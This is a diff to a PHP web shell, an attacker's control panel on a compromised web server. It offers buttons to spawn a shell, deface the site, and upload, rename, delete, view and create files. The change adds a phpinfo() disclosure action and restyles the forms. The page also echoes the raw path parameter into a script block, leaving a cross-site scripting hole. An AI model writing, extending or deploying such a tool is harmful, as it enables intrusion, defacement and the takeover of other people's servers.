@@ -10,18 +10,14 @@ if(isset($_GET["path"])) echo "Current dir: <a href='?path=".htmlspecialchars($_
 ?>
 
 <form method="GET">
-  <input type="text" name="path" autocomplete="off">
+  <input type="text" name="path" autocomplete="off" style="width:300px">
   <input type="submit" value="Go!!">
 </form>
 
 <?php
 if(isset($_GET["path"])) {
-  foreach(scandir(htmlspecialchars($_GET["path"])) as $patg) {
-    echo $patg."<br>";
-  }
   ?>
   
-  <br>
   <script>
     const path = document.querySelector('input[name=path]')
     path.value = '<?php echo $_GET["path"]; ?>'
@@ -30,8 +26,9 @@ if(isset($_GET["path"])) {
   <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnShell"><button type="button" name="shell">Spawn shell</button></a>
   <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnDeface"><button type="button" name="deface">Spawn deface</button></a>
   <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=rename"><button type="button" name="rename">Rename file</button></a>
+  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" name="infokan">Info min</button></a>
   <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" name="upload">Upload file</button></a><br>
-  <form method="POST">
+  <form method="POST" style="margin-top:10px;">
     <input type="text" name="delete" autocomplete="off">
     <input type="submit" name="delt" value="Delete">
     <input type="text" name="view" autocomplete="off">
@@ -73,9 +70,9 @@ if(isset($_GET["path"])) {
     ?>
     <br>
     <form method="POST">
-      <input type="text" name="filename"><br>
-      <textarea cols="50" rows="10" name="filetext"></textarea>
-      <input type="submit" name="touch" value="create">
+      <input type="text" name="filename" placeholder="Filename" style="width:410px;margin-bottom:5px;"><br>
+      <textarea cols="50" rows="10" name="filetext"></textarea><br>
+      <input type="submit" name="touch" value="Create" style="margin:5px 125px;padding:5px 50px;">
     </form>
     <?php
     if(isset($_POST["touch"])) {
@@ -121,6 +118,12 @@ if(isset($_GET["path"])) {
       }
     } else {
       echo "No file selected";
+    }
+  } elseif($_GET["path"] && $_GET["action"] == "info") {
+    phpinfo();
+  } else {
+    foreach(scandir(htmlspecialchars($_GET["path"])) as $patg) {
+      echo $patg."<br>";
     }
   }
 }
